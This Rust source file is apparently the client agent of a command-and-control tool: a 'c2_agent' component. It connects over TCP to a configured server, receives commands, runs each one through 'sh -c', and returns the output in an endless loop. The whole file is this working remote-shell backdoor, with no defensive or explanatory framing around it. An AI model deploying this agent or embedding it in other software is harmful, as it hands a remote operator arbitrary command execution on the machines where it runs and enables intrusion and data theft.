use std::{net::SocketAddr, process::Command, sync::Arc};

use anyhow::Result;
use rast::{
    messages::c2_agent::c2_agent::{create_message, get_message},
    protocols::{tcp::*, *},
    settings::*,
};

#[tokio::main]
async fn main() -> Result<()> {
    println!("Hello from client!");

    // TODO: add embedding during compile
    let settings = match Settings::new() {
        Ok(settings) => {
            println!("{:?}", settings);
            settings
        },
        Err(e) => {
            panic!("{:?}", e);
        },
    };

    if let Some(conf) = &settings.server.tcp {
        let mut client = TcpFactory::new_client(conf).await?;

        loop {
            let cmd = Arc::get_mut(&mut client).unwrap().recv().await?;
            let cmd = get_message(cmd).unwrap();
            let cmd = cmd.trim_end_matches('\0');

            let output = Command::new("sh").arg("-c").arg(cmd).output()?;
            let mut output = String::from_utf8_lossy(&output.stdout).to_string();

            if output.is_empty() {
                output.push('\n');
            }

            let msg = create_message(&output);
            Arc::get_mut(&mut client).unwrap().send(msg).await?;
        }
    };

    // let msg_s = "Checking in!";
    // client.send(msg_s.to_string()).await?;
    // println!("Message sent: {}", msg_s);

    Ok(())
}
